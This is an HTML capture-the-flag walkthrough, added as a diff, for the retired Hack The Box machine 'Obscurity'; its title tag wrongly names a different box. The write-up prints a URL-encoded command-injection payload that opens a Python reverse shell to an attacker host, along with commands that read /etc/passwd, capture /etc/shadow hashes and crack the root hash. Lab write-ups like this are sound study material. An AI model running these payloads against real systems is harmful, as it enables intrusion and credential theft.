@@ -1,0 +1,230 @@
+<html>
+
+<head>
+    <title>VulnHub Write-up: Hacker Fest 2019</title>
+    <link rel="stylesheet" type="text/css" href="index.css">
+</head>
+
+<body>
+    <article>
+        <h1>HTB Walkthrough | Obscurity</h1>
+        <div class="tag-container">
+            <span class="tag">htb</span>
+            <span class="tag">linux</span>
+            <span class="tag">python</span>
+            <span class="tag">crypto</span>
+        </div>
+        <p class="last-update">Last updated on May 2020.</p>
+
+        <p class="intro">
+            Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219" target="_blank">here</a>.
+        </p>
+
+        <div class="step">
+            <p>1. After doing an initial scan with nmap, we find only 2 exposed services: OpenSSH on port 22 and a custom web server on port 8080 - BadHTTPServer.</p>
+            <div class="code-block">
+                <div class="code-line">
+                    <span class="prompt">root@kali:/#</span>
+                    <code>nmap -p- -T5 -A 10.10.10.168</code>
+                </div>
+                <br>
+                <div class="code-line">
+                    <code>PORT STATE SERVICE VERSION</code>
+                </div>
+                <br>
+                <div class="code-line">
+                    <code>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</code>
+                </div>
+                <br>
+                <div class="code-line">
+                    <code>80/tcp closed http</code>
+                </div>
+                <br>
+                <div class="code-line">
+                    <code>8080/tcp open http-proxy BadHTTPServer <= custom web server</code>
+                </div>
+                <div class="code-line">
+                    <code>| fingerprint-strings:</code>
+                </div>
+                <div class="code-line">
+                    <code>| GetRequest, HTTPOptions:</code>
+                </div>
+                <div class="code-line">
+                    <code>| Server: BadHTTPServer</code>
+                </div>
+                <div class="code-line">
+                    <code>|_http-title: 0bscura</code>
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <p>2. There is some content on the website which has some useful information:</p>
+            <div>
+                <img  class="step_img_sm"  style="display: block;" src="./obscurity_img0_1.png"/><br>
+                <img  class="step_img_sm"  style="display: block;" src="./obscurity_img0_2.png"/><br>
+                <img  class="step_img_sm"  style="display: block;" src="./obscurity_img0_3.png"/>
+            </div>
+        </div>
+
+        <div class="step">
+            <p>3. So, now we know there is a file called 'SuperSecureServer.py' which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz" target="_blank">wfuzz</a> to find it but you could probably just get it logically:</p>
+            <div class="code-block">
+                <div class="code-line">
+                    <span class="prompt">root@kali:/#</span>
+                    <code>wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code>
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <p>4. The mistery directory is <strong>develop</strong>, so know we have access to the server's source code, in the form of a Python script: <a href="http://10.10.10.168:8080/develop/SuperSecureServer.py" target="_blank">http://10.10.10.168:8080/develop/SuperSecureServer.py</a>.<br>
+                While analysing it, we find something interesting:</p>
+            <img src="./obscurity_img1.png"/>
+        </div>
+
+        <div class="step">
+            <p>5. By exploiting this exec, we can format our request in a way that gets us a shell as wwwdata.</p>
+            <div class="code-block">
+                <div class="code-line">
+                    <span class="prompt">root@kali:/#</span>
+                    <code>wget http://10.10.10.168:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'</code>
+                </div>
+            </div>
+        </div>
+        
+        <div class="step">
+            <p>7. After looking at /etc/passwd we find our user</p>
+            <div class="code-block">
+                <div class="code-line">
+                    <span class="prompt">$</span>
+                    <code>cat etc/passwd</code>
+                </div>
+                <div class="code-line">
+                    <code>...</code>
+                </div>
+                <div class="code-line">
+                    <code>robert:x:1000:1000:robert:/home/robert:/bin/bash</code>
+                </div>
+            </div>
+        </div>
+        
+
+        <div class="step">
+            <p>7. Listing the contents of rober's home directy, we get some interesting files:</p>
+            <div class="code-block">
+                <div class="code-line">
+                    <span class="prompt">$</span>
+                    <code>ls /home/robert</code>
+                </div>
+                <div class="code-line">
+                    <code>BetterSSH/BetterSSH.py</code>
+                </div>
+                <div class="code-line">
+                    <code>check.txt</code>
+                </div>
+                <div class="code-line">
+                    <code>out.txt</code>
+                </div>
+                <div class="code-line">
+                    <code>passwordreminder.txt</code>
+                </div>
+                <div class="code-line">
+                    <code>SuperSecureCrypt.py</code>
+                </div>
+                <div class="code-line">
+                    <code>user.txt y</code>
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <p>8. Let's create a script to find the key</p>
+            <img src="./script1.png">
+        </div>
+
+        <div class="step">
+            <p>9. Now let's find robert's password</p>
+            <img src="./script2.png">
+        </div>
+    
+
+        <div class="step">
+            <p>10. Now that we have the user's password we can SSH into the machine, get the user flag and move on to root.<br>
+                We start by doing some enumeration with LinEnum</p>
+            <div class="code-block">
+                <div class="code-line">
+                    <span class="prompt">$</span>
+                    <code>./LinEnum.sh</code>
+                </div>
+                <div class="code-line">
+                    <code>...</code>
+                </div>
+                <div class="code-line">
+                    <code>User robert may run the following commands on obscure:</code>
+                </div>
+                <div class="code-line">
+                    <code>(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code>
+                </div>
+                <div class="code-line">
+                    <code>-e</code>
+                </div>
+            </div>
+        </div>
+        
+        <div class="step">
+            <p>11. Let's run BetterSSH as sudo to test this:</p>
+            <div class="code-block">
+                <div class="code-line">
+                    <span class="prompt">$</span>
+                    <code>sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code>
+                </div>
+                <div class="code-line">
+                    <code>Enter username: robert</code>
+                </div>
+                <div class="code-line">
+                    <code>Enter password: xxx</code>
+                </div>
+                <div class="code-line">
+                    <code>Authed!</code>
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <p>12. After looking at BetterSSH.py we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on  /tmp/SSH/.
+                So we create a script to print them as they're written:
+            </p>
+            <img src="script3.png"/>
+        </div>
+
+        <div class="step">
+            <p>13. Finally, we use JohnTheRipper to crack the hash:</p>
+            <div class="code-block">
+                <div class="code-line">
+                    <span class="prompt">root@kali:/#</span>
+                    <code>echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" > shadow</code>
+                </div>
+                <div class="code-line">
+                    <span class="prompt">root@kali:/#</span>
+                    <code>echo "root:x:0:0:root:/root:/bin/bash" > passwd</code>
+                </div>
+                <div class="code-line">
+                    <span class="prompt">root@kali:/#</span>
+                    <code>unshadow passwd shadow > crack.password.db</code>
+                </div>
+                <div class="code-line">
+                    <span class="prompt">root@kali:/#</span>
+                    <code>john crack.password.db</code>
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <p>14. That's it, hope you enjoyed it!</p>
+        </div>
+    
+    </article>
+</body>
+
+</html>
